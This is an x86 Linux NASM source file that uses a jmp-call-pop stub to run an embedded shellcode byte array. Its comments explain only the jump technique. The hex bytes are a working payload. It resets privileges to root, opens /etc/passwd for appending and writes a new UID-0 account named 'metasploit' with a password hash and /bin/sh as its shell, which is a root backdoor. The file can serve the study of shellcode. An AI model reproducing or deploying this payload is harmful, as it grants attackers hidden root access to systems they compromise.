; Filename: jmpCallPop.nasm
; Author:  Bobby Cooke
global _start
section .text
_start:
; 1. Jump to where our Shellcode string is
  jmp short call_shellcode
jmp2_shellcode:
; 3. Now that the memory location of our string is on the top of the
;     stack, we will pass control to it using the jmp instruction.
  pop eax
  jmp eax
call_shellcode:
; 2. Call to the instruction that will jump us into our Shellcode
;    - Call is like jump, but stores the memory location of the next
;       instruction onto the Stack; which is our Shellcode.
  call jmp2_shellcode
  shellcode: db 0x31,0xc9,0x89,0xcb,0x6a,0x46,0x58,0xcd,0x80,0x6a,0x05,\
0x58,0x31,0xc9,0x51,0x68,0x73,0x73,0x77,0x64,0x68,0x2f,\
0x2f,0x70,0x61,0x68,0x2f,0x65,0x74,0x63,0x89,0xe3,0x41,\
0xb5,0x04,0xcd,0x80,0x93,0xe8,0x28,0x00,0x00,0x00,0x6d,\
0x65,0x74,0x61,0x73,0x70,0x6c,0x6f,0x69,0x74,0x3a,0x41,\
0x7a,0x2f,0x64,0x49,0x73,0x6a,0x34,0x70,0x34,0x49,0x52,\
0x63,0x3a,0x30,0x3a,0x30,0x3a,0x3a,0x2f,0x3a,0x2f,0x62,\
0x69,0x6e,0x2f,0x73,0x68,0x0a,0x59,0x8b,0x51,0xfc,0x6a,\
0x04,0x58,0xcd,0x80,0x6a,0x01,0x58,0xcd,0x80
